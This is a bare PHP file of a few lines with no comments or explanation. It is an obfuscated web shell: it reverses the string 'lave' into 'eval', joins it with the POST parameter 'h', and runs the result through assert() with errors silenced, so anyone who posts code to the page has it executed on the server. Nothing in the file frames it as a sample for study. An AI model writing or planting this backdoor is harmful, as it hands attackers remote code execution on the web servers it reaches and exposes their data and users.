<?php 
$a='lave'; 
$b='($_POST[h])'; 
$a=strrev($a); 
@assert($a.$b); 
?>
